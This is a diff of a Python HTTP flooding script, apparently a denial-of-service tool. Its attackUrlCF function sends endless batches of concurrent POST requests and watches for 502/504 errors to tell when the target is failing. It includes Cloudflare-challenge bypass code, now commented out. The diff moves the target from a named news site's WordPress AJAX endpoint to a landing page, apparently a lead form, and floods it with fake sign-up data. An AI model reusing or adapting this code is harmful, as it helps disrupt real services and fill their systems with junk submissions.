@@ -85,7 +85,7 @@ def solveChanellnge(url):
 
 
 def attackUrlCF(baseUrl, threadNumber):	
-	cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
+	# cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 
 	while True:
 		try:
@@ -93,12 +93,13 @@ def attackUrlCF(baseUrl, threadNumber):
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-			data = {'action':"b2c_ajax_search",'s':str(random.randint(1,100000000))}
+			data = {"country":"NL","firstname":"asdasd","lastname":"asdasd","email": ''.join(random.choice(letters) for i in range(10)) + "@asd.com","telephone":"111111111"}
 
-			headers={'User-Agent': userAgent,
+			headers={
+			# 'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
 			'Accept-Encoding': 'gzip, deflate',
-			'Cookie': cookiesStr,
+			# 'Cookie': cookiesStr,
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
@@ -107,9 +108,10 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(20):
-				requestsArr.append(grequests.post(url, headers=headers, proxies=proxies, data=data))
+				requestsArr.append(grequests.post(url, headers=headers, data=data))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
+			print(res)
 			isClear = True
 			for r in res:
 				if str(r.status_code) in ['502', '504']:					
@@ -138,7 +140,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com/wp-admin/admin-ajax.php', i]).start()
+	Thread(target=attackUrlCF, args=['https://sol-e.pumpkinapopeye.tech/l/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzUzNDgyMjUsIm5iZiI6MTY3NTM0ODIyNSwiZXhwIjoxNjc1MzU5MDI1LCJkYXRhIjp7ImxhbmRlck5hbWUiOiJiaXRjb2RlX2FpX3YzIiwiaXBBZGRyZXNzIjoiMTY4LjEwMC4xMS4xMjQiLCJib3giOiIxMzBiZDYyZTgzMzc4N2U1OThkM2IwMmU2YzZiMTA0NCJ9fQ.tfjRXEZUfFu7iM6ct061S8Z53GxNRh_FvgEC89eceHA', i]).start()
 	time.sleep(30)
 input()
 
